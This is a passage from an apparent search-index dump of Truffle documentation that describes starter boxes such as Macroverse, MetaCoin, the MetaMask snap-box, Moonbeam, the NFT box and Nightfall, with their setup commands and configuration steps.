small developers to make big games. Access to the Macroverse system is controlled by a token, MRV , which functions as a software license. An Ethereum account must hold a minimum balance, currently 100 MRV , in order to query the Macroverse system on the live Ethereum network. Macroverse Game Ideas \u00b6 Develop an on-chain version of Konquest , played in a different galactic sector every time. Build a galaxy-spanning space trading game, with commodities in each station tradeable using smart contracts. Create a single-player 4X game, played in the browser. Take payments from players in Ether, with no app store needed. Use procedurally-generated terrain from Macroverse planets as the setting for an off-road racing simulator. Devise an orbital-mechanics-based strategy game, set around the moons of a gas giant. Make gameplay proceed in real time, and use blockchain technology to stop cheaters. Macroverse Development Status \u00b6 Currently, only the first major release of Macroverse, code-named Cannon , is deployed on the live Ethereum network. This release includes a galaxy of over 200 billion procedural stars, but does not currently implement planetary systems, orbital mechanics, or planetary terrain. Development of the next release, Kepler , can be tracked in the Macroverse Github repository . Bugs found in the Macroverse contracts should also be reported there. Getting Started \u00b6 Use this box with: truffle unbox NovakDistributed/macroverse-truffle-box This will create a default Macroverse-enabled Truffle project, with the macroverse NPM module installed as a dependency, and with a Truffle migration script to enable testnet deployment of the Macroverse Generator and Macroverse Registry contracts. Macroverse Star Generator Technical Background \u00b6 The Macroverse Star Generator is a smart contract, deployed at address 0xc9650c155Bb268A1667B5F9c68701638cAE93d3f , which is responsible for the procedural generation of the galaxy of stars that comprise the Macroverse universe. The galaxy is divided into sectors measuring 25 lightyears on a side. The universe as a whole extends 10,000 sectors in both directioons in X, Y, and Z from the origin, but most of the stars are concentrated in the galaxy, which consists of a disk with a radius of 6,800 sectors in the XZ plane, and a central spherical bulge with a radius of 1000 sectors. From the X, Y, and Z coordinates (in integers) of each sector, the number of objects (stars, black holes, or similar) in the sector is generated. From the sector coordinates and the object index, the object's seed is generated. The seed of an object serves as its unique identifier for the virtual real estate system, and is also used to generate its properties. Each object in the Macroverse world is assigned an ObjectClass from the following list: Supergiant Giant MainSequence WhiteDwarf NeutronStar BlackHole Actual stars are assigned a SpectralType according to the Harvard Spectral Classification system. Additionally, each object has an X, Y, Z position within its sector in light years, and a mass in solar masses. These are fractional values; since Solidity does not provide native support for non-integer types, these values are represented as fixed-point values (stored in a Solidity int128 ) with 40 fractional bits. The RealMath Solidity library is provided for working with these values in smart contracts, and the macroverse NPM module provides utility functions for converting to and from them in JavaScript code. Finally, each object has a flag indicating whether there are planets orbiting it. The actual planetary systems cannot yet be generated (they are coming in the Kepler phase of Macroverse development ), but the planetary system generation logic, when deployed, will respect this flag. Querying the Macroverse Star Generator from JavaScript \u00b6 // Make sure you have the Macroverse JavaScript library const mv = require(\"macroverse\") // Get the Macroverse contract // In Truffle testing code (assuming you have Truffle's `artifacts` in scope), you would do: // const MacroverseStarGenerator = artifacts.require(\"MacroverseStarGenerator\") // In real code, using truffle-contract const TruffleContract = require(\"truffle-contract\") const MacroverseStarGenerator = TruffleContract(require(\"macroverse/build/contracts/MacroverseStarGenerator.json\")) // You may need to point the contract at your web3 provider here // Either way, you need to get the deployed instance of the contract const generator = await MacroverseStarGenerator.deployed() // Then you can get the number of objects in a sector let objectCount = generator.getSectorObjectCount.call(0, 1, -1) for (let i = 0; i < objectCount; i++) { // Then you can loop over the objects and get the seed for each one let seed = await generator.getSectorObjectSeed.call(0, 1, -1, i) // And then you can get properties of the object, like its class let objectClass = await generator.getObjectClass.call(seed) // Use the Macroverse JS module to convert integers -> object class names console.log(\"Object \" + i + \" is a \" + mv.objectClasses[objectClass]) } The full Macroverse Star Generator API is documented inline in the smart contract source .", "title": "Macroverse Truffle Box"}, {"location": "boxes/macroverse-truffle-box/#macroverse-truffle-box", "text": "This box comes with everything a developer needs to use Macroverse in an Ethereum dapp or game.", "title": "Macroverse Truffle Box"}, {"location": "boxes/macroverse-truffle-box/#what-is-macroverse", "text": "Macroverse is a procedurally generated universe, available to be used by blockchain-based games. Rather than paying expensive gas costs to store environment and level data on the blockchain, or spending large amounts of developer effort on custom world generation algorithms, game developers can use Macroverse as a piece of game development middleware, and can find settings for their games by exploring the single, shared Macroverse universe. Macroverse provides trusted, proven world generation algorithms, and a shared universe accessible to all developers, allowing even small developers to make big games. Access to the Macroverse system is controlled by a token, MRV , which functions as a software license. An Ethereum account must hold a minimum balance, currently 100 MRV , in order to query the Macroverse system on the live Ethereum network.", "title": "What is Macroverse"}, {"location": "boxes/macroverse-truffle-box/#macroverse-game-ideas", "text": "Develop an on-chain version of Konquest , played in a different galactic sector every time. Build a galaxy-spanning space trading game, with commodities in each station tradeable using smart contracts. Create a single-player 4X game, played in the browser. Take payments from players in Ether, with no app store needed. Use procedurally-generated terrain from Macroverse planets as the setting for an off-road racing simulator. Devise an orbital-mechanics-based strategy game, set around the moons of a gas giant. Make gameplay proceed in real time, and use blockchain technology to stop cheaters.", "title": "Macroverse Game Ideas"}, {"location": "boxes/macroverse-truffle-box/#macroverse-development-status", "text": "Currently, only the first major release of Macroverse, code-named Cannon , is deployed on the live Ethereum network. This release includes a galaxy of over 200 billion procedural stars, but does not currently implement planetary systems, orbital mechanics, or planetary terrain. Development of the next release, Kepler , can be tracked in the Macroverse Github repository . Bugs found in the Macroverse contracts should also be reported there.", "title": "Macroverse Development Status"}, {"location": "boxes/macroverse-truffle-box/#getting-started", "text": "Use this box with: truffle unbox NovakDistributed/macroverse-truffle-box This will create a default Macroverse-enabled Truffle project, with the macroverse NPM module installed as a dependency, and with a Truffle migration script to enable testnet deployment of the Macroverse Generator and Macroverse Registry contracts.", "title": "Getting Started"}, {"location": "boxes/macroverse-truffle-box/#macroverse-star-generator-technical-background", "text": "The Macroverse Star Generator is a smart contract, deployed at address 0xc9650c155Bb268A1667B5F9c68701638cAE93d3f , which is responsible for the procedural generation of the galaxy of stars that comprise the Macroverse universe. The galaxy is divided into sectors measuring 25 lightyears on a side. The universe as a whole extends 10,000 sectors in both directioons in X, Y, and Z from the origin, but most of the stars are concentrated in the galaxy, which consists of a disk with a radius of 6,800 sectors in the XZ plane, and a central spherical bulge with a radius of 1000 sectors. From the X, Y, and Z coordinates (in integers) of each sector, the number of objects (stars, black holes, or similar) in the sector is generated. From the sector coordinates and the object index, the object's seed is generated. The seed of an object serves as its unique identifier for the virtual real estate system, and is also used to generate its properties. Each object in the Macroverse world is assigned an ObjectClass from the following list: Supergiant Giant MainSequence WhiteDwarf NeutronStar BlackHole Actual stars are assigned a SpectralType according to the Harvard Spectral Classification system. Additionally, each object has an X, Y, Z position within its sector in light years, and a mass in solar masses. These are fractional values; since Solidity does not provide native support for non-integer types, these values are represented as fixed-point values (stored in a Solidity int128 ) with 40 fractional bits. The RealMath Solidity library is provided for working with these values in smart contracts, and the macroverse NPM module provides utility functions for converting to and from them in JavaScript code. Finally, each object has a flag indicating whether there are planets orbiting it. The actual planetary systems cannot yet be generated (they are coming in the Kepler phase of Macroverse development ), but the planetary system generation logic, when deployed, will respect this flag.", "title": "Macroverse Star Generator Technical Background"}, {"location": "boxes/macroverse-truffle-box/#querying-the-macroverse-star-generator-from-javascript", "text": "// Make sure you have the Macroverse JavaScript library const mv = require(\"macroverse\") // Get the Macroverse contract // In Truffle testing code (assuming you have Truffle's `artifacts` in scope), you would do: // const MacroverseStarGenerator = artifacts.require(\"MacroverseStarGenerator\") // In real code, using truffle-contract const TruffleContract = require(\"truffle-contract\") const MacroverseStarGenerator = TruffleContract(require(\"macroverse/build/contracts/MacroverseStarGenerator.json\")) // You may need to point the contract at your web3 provider here // Either way, you need to get the deployed instance of the contract const generator = await MacroverseStarGenerator.deployed() // Then you can get the number of objects in a sector let objectCount = generator.getSectorObjectCount.call(0, 1, -1) for (let i = 0; i < objectCount; i++) { // Then you can loop over the objects and get the seed for each one let seed = await generator.getSectorObjectSeed.call(0, 1, -1, i) // And then you can get properties of the object, like its class let objectClass = await generator.getObjectClass.call(seed) // Use the Macroverse JS module to convert integers -> object class names console.log(\"Object \" + i + \" is a \" + mv.objectClasses[objectClass]) } The full Macroverse Star Generator API is documented inline in the smart contract source .", "title": "Querying the Macroverse Star Generator from JavaScript"}, {"location": "boxes/metacoin/", "text": "MetaCoin Box \u00b6 Requirements Setup Installation Deployment Usage Commands Testing Support This is an example of a completed coin-like contract built using Truffle. Note that this is not ERC-20 compatible, so it is not expected to interact with other coin/token contracts. Requirements \u00b6 The MetaCoin box has the following requirements: Node.js v12 or higher Truffle Ganache Helpful, but optional: An Infura account and Project ID A MetaMask account Setup \u00b6 Installation \u00b6 $ truffle unbox metacoin Deployment \u00b6 To deploy locally, start a local instance of ganache by running ganache Then, simply call truffle migrate Testing \u00b6 This box has examples for testing your smart contracts in both Javascript and Solidity. To run the tests locally, call truffle test Support \u00b6 Need help? Get in touch with the Truffle community by posting on Github Discussions !", "title": "MetaCoin Box"}, {"location": "boxes/metacoin/#metacoin-box", "text": "Requirements Setup Installation Deployment Usage Commands Testing Support This is an example of a completed coin-like contract built using Truffle. Note that this is not ERC-20 compatible, so it is not expected to interact with other coin/token contracts.", "title": "MetaCoin Box"}, {"location": "boxes/metacoin/#requirements", "text": "The MetaCoin box has the following requirements: Node.js v12 or higher Truffle Ganache Helpful, but optional: An Infura account and Project ID A MetaMask account", "title": "Requirements"}, {"location": "boxes/metacoin/#setup", "text": "", "title": "Setup"}, {"location": "boxes/metacoin/#installation", "text": "$ truffle unbox metacoin", "title": "Installation"}, {"location": "boxes/metacoin/#deployment", "text": "To deploy locally, start a local instance of ganache by running ganache Then, simply call truffle migrate", "title": "Deployment"}, {"location": "boxes/metacoin/#testing", "text": "This box has examples for testing your smart contracts in both Javascript and Solidity. To run the tests locally, call truffle test", "title": "Testing"}, {"location": "boxes/metacoin/#support", "text": "Need help? Get in touch with the Truffle community by posting on Github Discussions !", "title": "Support"}, {"location": "boxes/metamask-snap-box/", "text": "@metamask/snap-box \u00b6 This repository is a starter template that combines the TypeScript Template Snap with a Truffle Box , for developing and testing snaps that interact with smart contracts. MetaMask Snaps is a system that allows anyone to safely expand the capabilities of MetaMask. A snap is a program that we run in an isolated environment that can customize the wallet experience. Truffle Boxes are helpful boilerplates that allow you to focus on what makes your dapp unique. In addition to Truffle, Truffle Boxes can contain other helpful modules, Solidity contracts & libraries, front-end views and more; all the way up to complete example dapps. This box makes it easy to deploy and test contracts with a local Ganache instance, which can be used to test transaction insight snaps or smart contract account snaps. Pre-requisites \u00b6 Snaps should work with the latest LTS version of Node.js, but we recommend using the version specified in the .nvmrc file. If you use nvm you can easily switch to the right version by calling nvm use at the root of the project. This box uses Yarn v3.x. If you are using Node 16 or later you can enable it with corepack enable . To interact with (your) snaps, you will need to install MetaMask Flask , a canary distribution for developers that provides access to upcoming features. You should install Flask in a separate browser profile from any existing MetaMask installation. Before using this box, install Truffle and Ganache globally: npm install -g truffle ganache Installation \u00b6 You can install this box with Truffle: truffle unbox metamask/snap-box <dir_name> Alternatively, you can clone the snap-box repository using this GitHub template . Setup \u00b6 You can add your own Infura API key to fork the Ethereum blockchain in your local instance of Ganache. Copy the .env.dist file in packages/truffle/ to a new file .env and update the INFURA_PROJECT_ID variable with your API key. Then, you can take your Secret Recovery Phrase from MetaMask Flask and put it as the MNEMONIC_PHRASE in this same file. This will make your first Ethereum account as the deployer of the test contracts in Ganache and provide you with a balance for the first 10 accounts for local testing. Remember, you should never share your Secret Recovery Phrase with anyone, and you should never use a Secret Recovery Phrase from any version of MetaMask that you use to custody real funds. This .env file is never and should never be uploaded to GitHub (it is explicitly excluded in .gitignore ). This is only for testing locally with Ganache. Alternatively, you can take the Mnemonic Phrase generated by Truffle and use that as your Secret Recovery Phrase when setting up MetaMask Flask. This will guarantee that your transaction history is empty each time you start testing. Then, setup the development environment from the main directory: yarn install && yarn start You are now ready to start modifying the packages to build your snap. You can put smart contracts in packages/truffle/contracts and modify the files in packages/snap and packages/site . Connect MetaMask to your local Ganache instance by going into your settings and changing the network to \"Localhost 8545\" (if you cannot see it, make sure to click \"Show test networks\").", "title": "Index"}, {"location": "boxes/metamask-snap-box/#metamasksnap-box", "text": "This repository is a starter template that combines the TypeScript Template Snap with a Truffle Box , for developing and testing snaps that interact with smart contracts. MetaMask Snaps is a system that allows anyone to safely expand the capabilities of MetaMask. A snap is a program that we run in an isolated environment that can customize the wallet experience. Truffle Boxes are helpful boilerplates that allow you to focus on what makes your dapp unique. In addition to Truffle, Truffle Boxes can contain other helpful modules, Solidity contracts & libraries, front-end views and more; all the way up to complete example dapps. This box makes it easy to deploy and test contracts with a local Ganache instance, which can be used to test transaction insight snaps or smart contract account snaps.", "title": "@metamask/snap-box"}, {"location": "boxes/metamask-snap-box/#pre-requisites", "text": "Snaps should work with the latest LTS version of Node.js, but we recommend using the version specified in the .nvmrc file. If you use nvm you can easily switch to the right version by calling nvm use at the root of the project. This box uses Yarn v3.x. If you are using Node 16 or later you can enable it with corepack enable . To interact with (your) snaps, you will need to install MetaMask Flask , a canary distribution for developers that provides access to upcoming features. You should install Flask in a separate browser profile from any existing MetaMask installation. Before using this box, install Truffle and Ganache globally: npm install -g truffle ganache", "title": "Pre-requisites"}, {"location": "boxes/metamask-snap-box/#installation", "text": "You can install this box with Truffle: truffle unbox metamask/snap-box <dir_name> Alternatively, you can clone the snap-box repository using this GitHub template .", "title": "Installation"}, {"location": "boxes/metamask-snap-box/#setup", "text": "You can add your own Infura API key to fork the Ethereum blockchain in your local instance of Ganache. Copy the .env.dist file in packages/truffle/ to a new file .env and update the INFURA_PROJECT_ID variable with your API key. Then, you can take your Secret Recovery Phrase from MetaMask Flask and put it as the MNEMONIC_PHRASE in this same file. This will make your first Ethereum account as the deployer of the test contracts in Ganache and provide you with a balance for the first 10 accounts for local testing. Remember, you should never share your Secret Recovery Phrase with anyone, and you should never use a Secret Recovery Phrase from any version of MetaMask that you use to custody real funds. This .env file is never and should never be uploaded to GitHub (it is explicitly excluded in .gitignore ). This is only for testing locally with Ganache. Alternatively, you can take the Mnemonic Phrase generated by Truffle and use that as your Secret Recovery Phrase when setting up MetaMask Flask. This will guarantee that your transaction history is empty each time you start testing. Then, setup the development environment from the main directory: yarn install && yarn start You are now ready to start modifying the packages to build your snap. You can put smart contracts in packages/truffle/contracts and modify the files in packages/snap and packages/site . Connect MetaMask to your local Ganache instance by going into your settings and changing the network to \"Localhost 8545\" (if you cannot see it, make sure to click \"Show test networks\").", "title": "Setup"}, {"location": "boxes/moonbeam-truffle-box/", "text": "\u00b6 Moonbeam Truffle Box \u00b6 The first release of a Truffle box for Moonbeam. With it you will find a Truffle boilerplate setup to get started deploying smart contracts on Moonbeam quickly. Node and NPM Versions \u00b6 It is recommended to use the Active LTS version of Node.js. As of writing (July 2023), the following versions of Node and NPM are recommended: Node v18.16.1 NPM v9.7.2 Note: We noticed that if you are using npm v7.0.15 you might have some errors when running npm install . To fix this you can downgrade npm to an older release such as 6.14.9 or 7.0.8 by running, for exmaple, npm install -g npm@v6.14.9 . If you run into problems or notice this is out of date, please let us know by opening an issue or submitting a PR! \ud83d\udc9c Getting started \u00b6 To get started with the Moonbeam Truffle box, if you have Truffle installed globally, you can execute: mkdir moonbeam-truffle-box && cd moonbeam-truffle-box truffle unbox PureStake/moonbeam-truffle-box Nevertheless, the box has also Truffle as a dependency in case you do not want to have it installed globally. In such a case, you can directly clone the following repository: git clone https://github.com/PureStake/moonbeam-truffle-box cd moonbeam-truffle-box With the files in your local system, the next step is to install all dependencies by running: npm install The dependencies installed are the following: Minimist EthereumJS wallet: a lightweight wallet implementation. Web3 Provider Engine: a tool for composing custom Web3 providers. Truffle: this is not needed if you have installed it globally. Moonbeam Truffle Plugin: a tool to easily create your own Moonbeam development node for quick and iterative development (uses Docker). Networks \u00b6 Moonbeam Truffle Box is pre-configured with two networks: Moonbeam Development and Moonbase Alpha TestNet. To deploy in the development network please check the Moonbeam Truffle Plugin section to install and start your own local node. node_modules/.bin/truffle migrate --network dev node_modules/.bin/truffle migrate --network moonbase Note: if you have Truffle installed globally, you can replace node_modules/.bin/truffle for truffle . Moonbeam Truffle Plugin \u00b6 The plugin is used to get you started with a local development Moonbeam node quickly. You can check all available commands with the help flag: ./node_modules/.bin/truffle run moonbeam help The following commands are available: Install \u00b6 In this context, installing means downloading the Docker image of the Moonbeam development node (requires Docker to be installed). node_modules/.bin/truffle run moonbeam install Start \u00b6 Start the development Moonbeam node. node_modules/.bin/truffle run moonbeam start Stop \u00b6 Stop the development Moonbeam node. This will remove the container, thus purging the chain. node_modules/.bin/truffle run moonbeam stop Pause \u00b6 Pause the development Moonbeam node. node_modules/.bin/truffle run moonbeam pause Unpause \u00b6 Unpause the development Moonbeam node. node_modules/.bin/truffle run moonbeam unpause Status \u00b6 Shows the status of the development Moonbeam node. node_modules/.bin/truffle run moonbeam status Remove \u00b6 Removes the Docker image of the Moonbeam development node. node_modules/.bin/truffle run moonbeam remove Truffle Plugin Verify \u00b6 As a convenience, the truffle-plugin-verify plugin has also been included in the Moonbeam Truffle Box. You can use this plugin to verify smart contracts automatically on Moonscan . For more information on how to use the plugin with Moonbeam, you can checkout the Using the Truffle Verify Plugin section of the Moonbeam documentation. Contact Us \u00b6 We welcome any feedback, so feel free to reach out through our official Discord Channel .", "title": "Index"}, {"location": "boxes/moonbeam-truffle-box/#_1", "text": "", "title": ""}, {"location": "boxes/moonbeam-truffle-box/#moonbeam-truffle-box", "text": "The first release of a Truffle box for Moonbeam. With it you will find a Truffle boilerplate setup to get started deploying smart contracts on Moonbeam quickly.", "title": "Moonbeam Truffle Box"}, {"location": "boxes/moonbeam-truffle-box/#node-and-npm-versions", "text": "It is recommended to use the Active LTS version of Node.js. As of writing (July 2023), the following versions of Node and NPM are recommended: Node v18.16.1 NPM v9.7.2 Note: We noticed that if you are using npm v7.0.15 you might have some errors when running npm install . To fix this you can downgrade npm to an older release such as 6.14.9 or 7.0.8 by running, for exmaple, npm install -g npm@v6.14.9 . If you run into problems or notice this is out of date, please let us know by opening an issue or submitting a PR! \ud83d\udc9c", "title": "Node and NPM Versions"}, {"location": "boxes/moonbeam-truffle-box/#getting-started", "text": "To get started with the Moonbeam Truffle box, if you have Truffle installed globally, you can execute: mkdir moonbeam-truffle-box && cd moonbeam-truffle-box truffle unbox PureStake/moonbeam-truffle-box Nevertheless, the box has also Truffle as a dependency in case you do not want to have it installed globally. In such a case, you can directly clone the following repository: git clone https://github.com/PureStake/moonbeam-truffle-box cd moonbeam-truffle-box With the files in your local system, the next step is to install all dependencies by running: npm install The dependencies installed are the following: Minimist EthereumJS wallet: a lightweight wallet implementation. Web3 Provider Engine: a tool for composing custom Web3 providers. Truffle: this is not needed if you have installed it globally. Moonbeam Truffle Plugin: a tool to easily create your own Moonbeam development node for quick and iterative development (uses Docker).", "title": "Getting started"}, {"location": "boxes/moonbeam-truffle-box/#networks", "text": "Moonbeam Truffle Box is pre-configured with two networks: Moonbeam Development and Moonbase Alpha TestNet. To deploy in the development network please check the Moonbeam Truffle Plugin section to install and start your own local node. node_modules/.bin/truffle migrate --network dev node_modules/.bin/truffle migrate --network moonbase Note: if you have Truffle installed globally, you can replace node_modules/.bin/truffle for truffle .", "title": "Networks"}, {"location": "boxes/moonbeam-truffle-box/#moonbeam-truffle-plugin", "text": "The plugin is used to get you started with a local development Moonbeam node quickly. You can check all available commands with the help flag: ./node_modules/.bin/truffle run moonbeam help The following commands are available:", "title": "Moonbeam Truffle Plugin"}, {"location": "boxes/moonbeam-truffle-box/#install", "text": "In this context, installing means downloading the Docker image of the Moonbeam development node (requires Docker to be installed). node_modules/.bin/truffle run moonbeam install", "title": "Install"}, {"location": "boxes/moonbeam-truffle-box/#start", "text": "Start the development Moonbeam node. node_modules/.bin/truffle run moonbeam start", "title": "Start"}, {"location": "boxes/moonbeam-truffle-box/#stop", "text": "Stop the development Moonbeam node. This will remove the container, thus purging the chain. node_modules/.bin/truffle run moonbeam stop", "title": "Stop"}, {"location": "boxes/moonbeam-truffle-box/#pause", "text": "Pause the development Moonbeam node. node_modules/.bin/truffle run moonbeam pause", "title": "Pause"}, {"location": "boxes/moonbeam-truffle-box/#unpause", "text": "Unpause the development Moonbeam node. node_modules/.bin/truffle run moonbeam unpause", "title": "Unpause"}, {"location": "boxes/moonbeam-truffle-box/#status", "text": "Shows the status of the development Moonbeam node. node_modules/.bin/truffle run moonbeam status", "title": "Status"}, {"location": "boxes/moonbeam-truffle-box/#remove", "text": "Removes the Docker image of the Moonbeam development node. node_modules/.bin/truffle run moonbeam remove", "title": "Remove"}, {"location": "boxes/moonbeam-truffle-box/#truffle-plugin-verify", "text": "As a convenience, the truffle-plugin-verify plugin has also been included in the Moonbeam Truffle Box. You can use this plugin to verify smart contracts automatically on Moonscan . For more information on how to use the plugin with Moonbeam, you can checkout the Using the Truffle Verify Plugin section of the Moonbeam documentation.", "title": "Truffle Plugin Verify"}, {"location": "boxes/moonbeam-truffle-box/#contact-us", "text": "We welcome any feedback, so feel free to reach out through our official Discord Channel .", "title": "Contact Us"}, {"location": "boxes/nft-box/", "text": "Truffle NFT Box \u00b6 Truffle NFT Box Requirements Setup Installation Support Requirements \u00b6 The NFT Box has the following requirements: Node.js 10.x or later NPM version 5.2 or later Windows, Linux or MacOS Helpful, but optional: - An Infura account and Project ID - A MetaMask account Setup \u00b6 Installation \u00b6 First ensure you are in a new and empty directory. Run the unbox command via npx and skip to step 3. This will install all necessary dependencies. A Create-React-App is generated in the client directory. npx truffle unbox nft - box Alternatively, you can install Truffle globally and run the unbox command. npm install - g truffle truffle unbox nft - box In the root directory install the required dependices. This will install a few things along with Open Zeppelin Contracts check them out here for more info. javascript npm install @openzeppelin/contracts Add the contructor arguments to deployer function in 2_deploy_contracts.js . The URI for your NFT images must be passed as the first argument. The name and symbol of the token will be passed as the second and third respectively. ```javascript module.exports = function(deployer) { deployer.deploy(NFTCollection,\"YOUR URI\",\"TOKEN NAME\",\"TOKEN SYMBOL\"); }; `````` In the root directory install the required dependices. This will install a few things along with Open Zeppelin Contracts check them out here for more info. javascript npm install Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . ```javascript compile migrate In the client directory, we run the React app. Smart contract changes must be manually recompiled and migrated. // in another terminal (i.e. not in the truffle develop prompt) cd client npm install npm run start After migrating your contracts head to the client directory and run npm run start to view the application in your http://localhost:3000/ . Connect your wallet and mint your first NFT! You can check the developer console to see the transaction has and if you deploy to rinkeby you will be able to see the NFT on their test-net site here . To build the application for production, use the build script. A production build will be in the client/build folder. // ensure you are inside the client directory when running this npm run build Deployment \u00b6 To deploy your contracts to a public network (such as a testnet or mainnet) there are two approaches. The first uses Truffle Dashboard which provides \"an easy way to use your existing MetaMask wallet for your deployments\". The second, requires copying your private key or mnemonic into your project so the deployment transactions can be signed prior to submission to the network. Using Truffle Dashboard (recommended) \u00b6 Truffle Dashboard ships with Truffle and can be started with truffle dashboard . This in turn loads the dashboard at http://localhost:24012 and beyond that you'll just need to run your migration ( truffle migrate ). A more detailed guide to using Truffle Dashboard is available here . Using the env File \u00b6 You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.js file expects a MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the Arbitrum network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: 1) Use touch .env in the command line to create a .env file at the root of your project. 2) Open the .env file in your preferred IDE 3) Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"<YOUR MNEMONIC HERE>\" INFURA_KEY=\"<Your Infura Project ID>\" RINKEBY_MNEMONIC=\"<Your Rinkeby Mnemonic>\" MAINNET_MNEMONIC=\"<Your Mainnet Mnemonic>\" 4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] . Support \u00b6 Support for this box is available via the Truffle community available here .", "title": "Truffle NFT Box"}, {"location": "boxes/nft-box/#truffle-nft-box", "text": "Truffle NFT Box Requirements Setup Installation Support", "title": "Truffle NFT Box"}, {"location": "boxes/nft-box/#requirements", "text": "The NFT Box has the following requirements: Node.js 10.x or later NPM version 5.2 or later Windows, Linux or MacOS Helpful, but optional: - An Infura account and Project ID - A MetaMask account", "title": "Requirements"}, {"location": "boxes/nft-box/#setup", "text": "", "title": "Setup"}, {"location": "boxes/nft-box/#installation", "text": "First ensure you are in a new and empty directory. Run the unbox command via npx and skip to step 3. This will install all necessary dependencies. A Create-React-App is generated in the client directory. npx truffle unbox nft - box Alternatively, you can install Truffle globally and run the unbox command. npm install - g truffle truffle unbox nft - box In the root directory install the required dependices. This will install a few things along with Open Zeppelin Contracts check them out here for more info. javascript npm install @openzeppelin/contracts Add the contructor arguments to deployer function in 2_deploy_contracts.js . The URI for your NFT images must be passed as the first argument. The name and symbol of the token will be passed as the second and third respectively. ```javascript module.exports = function(deployer) { deployer.deploy(NFTCollection,\"YOUR URI\",\"TOKEN NAME\",\"TOKEN SYMBOL\"); }; `````` In the root directory install the required dependices. This will install a few things along with Open Zeppelin Contracts check them out here for more info. javascript npm install Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . ```javascript compile migrate In the client directory, we run the React app. Smart contract changes must be manually recompiled and migrated. // in another terminal (i.e. not in the truffle develop prompt) cd client npm install npm run start After migrating your contracts head to the client directory and run npm run start to view the application in your http://localhost:3000/ . Connect your wallet and mint your first NFT! You can check the developer console to see the transaction has and if you deploy to rinkeby you will be able to see the NFT on their test-net site here . To build the application for production, use the build script. A production build will be in the client/build folder. // ensure you are inside the client directory when running this npm run build", "title": "Installation"}, {"location": "boxes/nft-box/#deployment", "text": "To deploy your contracts to a public network (such as a testnet or mainnet) there are two approaches. The first uses Truffle Dashboard which provides \"an easy way to use your existing MetaMask wallet for your deployments\". The second, requires copying your private key or mnemonic into your project so the deployment transactions can be signed prior to submission to the network.", "title": "Deployment"}, {"location": "boxes/nft-box/#using-truffle-dashboard-recommended", "text": "Truffle Dashboard ships with Truffle and can be started with truffle dashboard . This in turn loads the dashboard at http://localhost:24012 and beyond that you'll just need to run your migration ( truffle migrate ). A more detailed guide to using Truffle Dashboard is available here .", "title": "Using Truffle Dashboard (recommended)"}, {"location": "boxes/nft-box/#using-the-env-file", "text": "You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.js file expects a MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the Arbitrum network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: 1) Use touch .env in the command line to create a .env file at the root of your project. 2) Open the .env file in your preferred IDE 3) Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"<YOUR MNEMONIC HERE>\" INFURA_KEY=\"<Your Infura Project ID>\" RINKEBY_MNEMONIC=\"<Your Rinkeby Mnemonic>\" MAINNET_MNEMONIC=\"<Your Mainnet Mnemonic>\" 4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] .", "title": "Using the env File"}, {"location": "boxes/nft-box/#support", "text": "Support for this box is available via the Truffle community available here .", "title": "Support"}, {"location": "boxes/nightfall/", "text": "Nightfall Truffle Box \u00b6 The easiest way to get started on Nightfall . Supported hardware & prerequisites \u00b6 Mac and Linux machines with at least 16GB of memory and 10GB of disk space are supported. Nightfall requires the following software to run: Docker Launch Docker Desktop (on Mac, it is on the menu bar) and set memory to 8GB with 4GB of swap space (minimum - 12GB memory is better) or 16GB of memory with 512MB of swap. The default values for Docker Desktop will NOT work. No, they really won't . Node (tested with 10.15.3) with npm and node-gyp If running macOS, install Xcode then run xcode-select \u2014install to install command line tools. Note: Currently will not work with node v12. To check the node version, run node --version . If using mac/brew, then you may need to run brew install node@10 and brew link --overwrite node@10 --force Python Be sure npm is setup to use v2.7 of python, not python3. To check the python version, run python --version You may need to run npm config set python /usr/bin/python2.7 (or wherever your python 2 location is) Installation \u00b6 First ensure you are in a new and empty directory. Run the unbox command via npx and skip to step 3. This will install all necessary dependencies. npx truffle unbox nightfall Alternatively, you can install Truffle globally and run the unbox command. npm install - g truffle truffle unbox nightfall Start Docker. In the root project directory, we generate the keys and constraint files for our Zero Knowledge Proofs . This is about 7GB and depends on randomness for security. This step can take a while, depending on your hardware (1-3 hours) . Before you begin, check once more you have provisioned enough memory for Docker. npm run setup Alternatively, you can generate specific verification keys and constraint files one at time using a prompt. npm run setup - prompt Now, run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Execute the script provided for registering Zero Knowledge Proof verification keys on-chain. Note inside the development console we don't preface commands with truffle . exec scripts / registerVks . js Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console.. truffle test FAQ \u00b6 How do I use this with Ganache-CLI? It's as easy as modifying the config file! Check out our documentation on adding network configurations . Where can I find more documentation? This box is a marriage of Truffle , Nightfall , and ZoKrates . Any of them would be a great place to start! Acknowledgements \u00b6 This software uses ZoKrates which is licensed under LGPL3 .", "title": "Nightfall Truffle Box"}, {"location": "boxes/nightfall/#nightfall-truffle-box", "text": "The easiest way to get started on Nightfall .", "title": "Nightfall Truffle Box"}, {"location": "boxes/nightfall/#supported-hardware-prerequisites", "text": "Mac and Linux machines with at least 16GB of memory and 10GB of disk space are supported. Nightfall requires the following software to run: Docker Launch Docker Desktop (on Mac, it is on the menu bar) and set memory to 8GB with 4GB of swap space (minimum - 12GB memory is better) or 16GB of memory with 512MB of swap. The default values for Docker Desktop will NOT work. No, 